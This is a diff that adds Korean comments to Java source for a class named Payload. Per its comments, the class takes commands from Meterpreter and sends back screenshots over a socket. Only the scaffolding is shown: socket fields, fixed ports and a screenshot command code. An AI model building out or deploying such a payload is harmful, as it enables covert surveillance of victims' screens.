@@ -14,20 +14,40 @@ import java.net.Socket;
 
 import javax.imageio.ImageIO;
 
+/**
+ * Payload 내부에서 사용될 설정값 등 공유자원
+ * @author root
+ *
+ */
 class pRes {
 	
 	public static Socket socket;
 	public static final int LISTEN_PORT = 17201;
 
+	/**
+	 * 세션의 중복연결을 방지하기 위해 초기 실행 시 서버 소켓을 개방하게 된다
+	 * 중복연결이 감지된다면 초기 실행 시 서버 소켓에 대한 포트 중복이 일어남으로 실행이 중지된다
+	 */
 	public static ServerSocket corruptedBlockSocket;
 	public static final int CORRUPTED_PORT = 17200;
 }
 
+/**
+ * 소켓 통신간 규약
+ * @author root
+ *
+ */
 class Cmd {
 	
 	public static final String TAKE_SCREEN_SHOT = "TSS";
 }
 
+/**
+ * 엔트리 클래스, Payload 초기 실행 시 서버 소켓 활성 여부를 검사해 중복 연결을 막는다
+ * Meterpreter로부터의 커맨드를 대기하고 커맨드가 들어올때마다 현재 화면을 전송한다
+ * @author root
+ *
+ */
 public class Payload {
 	
 	private ObjectOutputStream oos;
